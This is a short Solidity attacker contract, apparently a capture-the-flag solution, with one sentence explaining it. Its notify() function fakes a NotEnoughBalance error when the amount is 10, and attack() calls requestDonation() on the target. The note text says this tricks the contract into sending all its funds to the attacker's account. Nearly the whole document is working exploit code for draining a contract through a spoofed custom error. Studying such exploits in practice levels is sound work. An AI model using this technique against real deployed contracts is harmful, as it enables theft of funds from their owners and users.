```javascript
contract INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance(); 
        }
    }
    
    function attack(address addr) public {
        (bool success, ) = addr.call(abi.encodeWithSignature("requestDonation()"));
        require(success, "Cannot receive donation.");
    }
}
```


We raise the `NotEnoughBalance` error even when there is enough balance to trick the contract into sending all its fund to our account.
